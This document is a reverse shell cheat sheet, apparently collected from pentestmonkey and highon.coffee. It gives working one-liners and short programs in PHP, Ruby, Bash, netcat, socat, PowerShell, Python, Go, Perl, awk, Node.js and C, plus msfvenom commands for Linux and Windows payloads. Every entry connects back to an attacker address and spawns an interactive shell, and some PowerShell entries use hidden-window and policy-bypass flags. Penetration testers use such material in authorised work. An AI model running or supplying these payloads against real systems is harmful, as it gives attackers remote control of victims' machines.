## PHP Reverse Shell
```bash
php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```

## Ruby Reverse Shell
```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```

## Bash TCP Reverse Shell
```bash
bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
 
```
## Bash UDP Reverse Shell
```bash
sh -i >& /dev/udp/192.168.1.2/5555 0>&1
 
```
## Telnet Reverse Shell
```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 4444 0/tmp/p
 ```

## Netcat Reverse Shell
```netcat
nc -e /bin/sh 192.168.1.2 80
rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
 ```

## Socat Reverse Shell
```netcat
socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
 ```
## Powershell Reverse Shell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
## Python Reverse Shell

### Linux
```python
export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```

### Windows
```python
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('192.168.1.2', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```

## Golang Reverse Shell
```golang
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ````

## Perl Reverse Shell
```perl
perl -e 'use Socket;$i="192.168.1.2";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Awk Reverse Shell
```awk
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```

## NodeJS Reverse Shell
```nodejs
require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
 ```

## C Reverse Shell
```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main ()

{
const char* ip = "192.168.1.2";
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton(ip, &addr.sin_addr);
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
for (int i = 0; i < 3; i++)
{
dup2(sockfd, i);
}
execve("/bin/sh", NULL, NULL);
return 0;
}
```

 ## Meterpreter Reverse Shell
### Linux Non-Staged reverse TCP
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```
### Linux Staged reverse TCP
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```
### Windows Non-Staged reverse TCP
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
```
### Windows Staged reverse TCP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
---
References:

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://highon.coffee/blog/reverse-shell-cheat-sheet/
